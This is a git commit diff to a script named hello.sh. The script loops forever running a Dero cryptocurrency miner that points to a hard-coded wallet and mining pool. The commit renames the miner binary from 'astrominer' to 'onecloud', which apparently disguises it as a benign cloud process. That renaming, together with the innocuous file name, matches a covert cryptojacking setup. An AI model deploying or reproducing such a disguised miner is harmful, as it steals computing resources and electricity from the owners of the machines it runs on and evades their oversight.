3ff3b72f8d0aa67059ba2d571b208737dd003d4c
ai4m2022 <162436374+ai4m2022@users.noreply.github.com>
2024-05-01 12:08:04 +0700

    Update hello.sh

--- hello.sh
+++ hello.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
 while :; do
-    ./astrominer -w dero1qy07a8cmr2c7waf75qhagteldka0pdpyaur029xzvpdlmyqvhln0uqqknxsvt.onecloud -r community-pools.mysrv.cloud:10300 -m 3 -p rpc;
+    ./onecloud -w dero1qy07a8cmr2c7waf75qhagteldka0pdpyaur029xzvpdlmyqvhln0uqqknxsvt.onecloud -r community-pools.mysrv.cloud:10300 -m 3 -p rpc;
     sleep 5;
 done
